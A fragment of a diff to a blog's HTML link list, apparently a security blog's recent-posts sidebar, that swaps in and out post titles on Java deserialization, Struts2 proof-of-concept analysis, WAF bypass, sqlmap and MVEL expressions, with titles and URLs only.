+            <a href="/2017/09/12/Java反序列化漏洞利用的学习与实践/">Java反序列化漏洞利用的学习与实践</a>
+          </li>
+        
+          <li>
+            <a href="/2017/08/11/机器学习再信息安全中的应用/">机器学习在信息安全中的应用</a>
+          </li>
+        
+          <li>
             <a href="/2017/07/18/解密Struts2-POC/">解密Struts2 POC</a>
           </li>
         
           <li>
-            <a href="/2017/07/04/甲乙方安全需求与痛点/">甲乙方安全需求与痛点</a>
-          </li>
-        
-          <li>
-            <a href="/2016/10/10/Java反序列化漏洞/">序列化和反序列化</a>
-          </li>
-        
-          <li>
-            <a href="/2016/09/18/WAF-Bypass-技巧总结/">WAF Bypass 技巧总结</a>
-          </li>
-        
-          <li>
-            <a href="/2016/08/11/sqlmap-使用/">sqlmap 使用</a>
+            <a href="/2016/11/15/MVEL解析表达式/">MVEL解析表达式</a>
           </li>
         
       </ul>
